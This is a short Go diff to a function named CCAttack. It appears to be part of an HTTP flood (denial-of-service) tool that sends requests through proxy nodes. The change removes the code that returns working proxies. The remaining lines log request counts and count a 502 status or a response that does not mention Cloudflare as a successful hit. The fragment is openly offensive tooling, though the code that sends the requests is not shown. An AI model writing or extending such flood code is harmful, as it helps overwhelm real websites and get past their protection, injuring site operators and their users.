@@ -51,7 +51,7 @@ func urlToMetadata(rawURL string) (addr C.Metadata, err error) {
 	return
 }
 
-func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies Nodes, err error) {
+func CCAttack(p *Nodes, counts *int, status *int) (err error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
 	defer cancel()
 
@@ -97,11 +97,9 @@ func CCAttack(p *Nodes, counts *int, status *int) (aliveProxies Nodes, err error
 	_ = json.Unmarshal(resp.Body(), &buf)
 	switch {
 	case resp.StatusCode() == 502:
-		aliveProxies = *p
 		fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
 		return
 	case !strings.Contains(resp.String(), "cloudflare") && err == nil:
-		aliveProxies = *p
 		switch {
 		case buf["data"] != nil:
 			fmt.Printf("[%d] %d\n", *counts, resp.StatusCode())
